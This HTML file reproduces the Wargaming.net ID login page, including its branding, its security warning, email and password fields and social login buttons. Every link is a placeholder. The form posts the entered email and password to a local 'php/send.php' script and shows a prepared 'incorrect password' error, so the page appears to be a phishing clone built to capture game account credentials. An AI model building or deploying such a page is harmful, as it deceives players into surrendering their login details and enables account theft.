<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=380, initial-scale=1.0" />
    <link rel="icon" href="assets/favicon/favicon.ico" />
    <link
      rel="apple-touch-icon"
      href="assets/favicon/apple-touch-icon_180.png"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700;800&family=Roboto+Condensed:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="css/styles.css" />
    <title>Wargaming.net ID</title>
  </head>
  <body>
    <header class="header">
      <div class="header__wrapper">
        <div class="header__block header__left">
          <span class="header__left-logo">
            <a href="#" class="header__logo-link">
              <svg
                width="19px"
                height="19px"
                version="1.1"
                class="header__logo-svg"
                id="Layer_1"
                xmlns="http://www.w3.org/2000/svg"
                xmlns:xlink="http://www.w3.org/1999/xlink"
                x="0px"
                y="0px"
                viewBox="0 0 19 19"
                enable-background="new 0 0 19 19"
                xml:space="preserve"
              >
                <path
                  class="header__logo-styles"
                  fill-rule="evenodd"
                  clip-rule="evenodd"
                  fill="#9b9b9b"
                  d="M1.8,9.5c0-4.3,3.4-7.7,7.7-7.7c4.2,0,7.7,3.4,7.7,7.7
	c0,2.8-1.5,5.3-3.8,6.6c0.5-1.7,0.7-3.4,0.6-5.4c0.5,0.1,0.8,0.2,1.3,0.4c-0.6-1.4-1.2-2.8-2-4.1c-0.7,1.4-1.7,2.7-2.7,3.7l1.6-0.1
	c-1.4,2.5-3.3,3.6-5.8,4c-0.6-2.7-0.2-7.3,3-9.4l0.3,1.5c0.6-1,1.8-2.3,2.7-3.2C11,3.1,9.4,2.9,7.8,3.2C8,3.4,8.4,3.7,8.6,3.9
	c-3.5,1.5-5.5,3.9-6.7,6.8C1.8,10.3,1.8,9.9,1.8,9.5L1.8,9.5z M9.5,19c5.2,0,9.5-4.3,9.5-9.5C19,4.3,14.7,0,9.5,0S0,4.3,0,9.5
	C0,14.7,4.3,19,9.5,19L9.5,19z"
                />
              </svg>
            </a>
          </span>
          <span class="header__text header__left-games">Games</span>
          <span class="header__text header__left-services">Services</span>
          <span class="header__left-premium">
            <a href="#" class="header__text header__premium-link"
              >Premium Shop</a
            >
          </span>
          <span class="header__left-support">
            <a href="#" class="header__text header__support-link"
              >Player Support</a
            >
          </span>
        </div>
        <div class="header__block header__right">
          <span class="header__text header__right-create">
            <a href="#" class="header__text header__create-link"
              >Create account</a
            >
          </span>
        </div>
      </div>
    </header>
    <header class="header__logo-block">
      <div class="header__logo-wrapper">
        <img
          src="./assets/imgs/wg_logo_airy.png"
          alt="Wargaming logo"
          class="header__logo-img"
        />
      </div>
    </header>
    <main class="main">
      <div class="main__wrapper">
        <div class="main__overview">
          <h1 class="main__title-text">Log in</h1>
          <p class="main__description-text">
            Use only this page to log into your Wargaming.net account. You will
            be authenticated on all Wargaming.net websites. To avoid any chance
            of a security breach, do not enter your login and password on other
            websites.
          </p>
        </div>
        <div class="main__signin">
          <div class="main__signin-item main__form">
            <form
              action="php/send.php"
              method="POST"
              class="main__signin-form"
              id="form"
            >
              <p class="main__signin-title main__form-title">
                Use your Wargaming.net account to log in
              </p>
              <div class="main__signin-block">
                <div class="main__input-block">
                  <div class="main__input-error non-visible" id="error">
                    <img
                      src="assets/imgs/error.png"
                      alt="Error"
                      class="main__error-img"
                    />
                    <p class="main__error-text">
                      Incorrect email address or password.
                    </p>
                  </div>
                  <input
                    placeholder="Email address"
                    type="email"
                    class="main__signin-input"
                    name="Email"
                    pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$"
                    required
                  />
                  <input
                    placeholder="Password"
                    type="password"
                    class="main__signin-input"
                    name="Password"
                    min="6"
                    max="32"
                    required
                  />
                </div>
                <div class="main__submit-block">
                  <div class="main__button-block">
                    <button type="submit" class="main__button-item">
                      Log in
                    </button>
                  </div>
                  <div class="main__checkbox-block">
                    <input
                      class="main__checkbox-item"
                      type="checkbox"
                      name="remember"
                      id="id_remember"
                    />
                    <label for="id_remember">Remember me</label>
                  </div>
                </div>
                <div class="main__login-info-block">
                  <p class="main__login-info-text">
                    Cannot log in?
                    <a href="#" class="main__login-info-link"
                      >Recover Account</a
                    >
                  </p>
                  <p class="main__login-info-text">
                    Don’t have a Wargaming.net ID yet?
                    <a href="#" class="main__login-info-link">Create Account</a>
                  </p>
                </div>
              </div>
            </form>
          </div>
          <div class="main__signin-item main__socials">
            <p class="main__signin-title main__socials-title">
              Log in with your social profile:
            </p>
            <ul class="main__buttons-list">
              <li class="amazon-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img
                      src="./assets/imgs/btn-icons/icon_amazon-d.svg"
                      alt=""
                  /></span>
                  <span class="main__buttons-item-text">Amazon</span>
                </a>
              </li>
              <li class="facebook-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img
                      src="./assets/imgs/btn-icons/icon_facebook-c.svg"
                      alt=""
                  /></span>
                  <span class="main__buttons-item-text">Facebook</span></a
                >
              </li>
              <li class="google-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img
                      src="./assets/imgs/btn-icons/icon_google-d.svg"
                      alt=""
                  /></span>
                  <span class="main__buttons-item-text">Google</span></a
                >
              </li>
              <li class="microsoft-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img src="./assets/imgs/btn-icons/icon_live-d.svg" alt=""
                  /></span>
                  <span class="main__buttons-item-text">Microsoft</span></a
                >
              </li>
              <li class="twitch-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img
                      src="./assets/imgs/btn-icons/icon_twitch-d.svg"
                      alt=""
                  /></span>
                  <span class="main__buttons-item-text">Twitch</span></a
                >
              </li>
              <li class="steam-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img src="./assets/imgs/btn-icons/icon_steam-d.svg" alt=""
                  /></span>
                  <span class="main__buttons-item-text">Steam</span></a
                >
              </li>
              <li class="egs-button main__buttons-item">
                <a href="#" class="main__buttons-item-link">
                  <span class="main__buttons-item-logo"
                    ><img src="./assets/imgs/btn-icons/icon_egs-d.svg" alt=""
                  /></span>
                  <span class="main__buttons-item-text">Epic Games</span></a
                >
              </li>
            </ul>
          </div>
        </div>
      </div>
    </main>
    <footer class="footer">
      <div class="footer__wrapper">
        <div class="footer__airy-block">
          <div class="footer__airy-left">
            <a href="#" class="footer__text footer__airy-link"
              >End User License Agreement</a
            >
            <a href="#" class="footer__text footer__airy-link"
              >Privacy Policy</a
            >
            <a href="#" class="footer__text footer__airy-link"
              >Terms of Service</a
            >
            <a href="#" class="footer__text footer__airy-link"
              >Parental Control</a
            >
          </div>
          <div class="footer__airy-right">
            <a href="#" class="footer__text footer__airy-language"
              >Europe (English)</a
            >
          </div>
        </div>
        <div class="footer__copyright-block">
          <p class="footer__copyright-text">
            © 2009–2023 Wargaming.net All rights reserved
          </p>
        </div>
      </div>
    </footer>
    <script src="js/send.js"></script>
  </body>
</html>
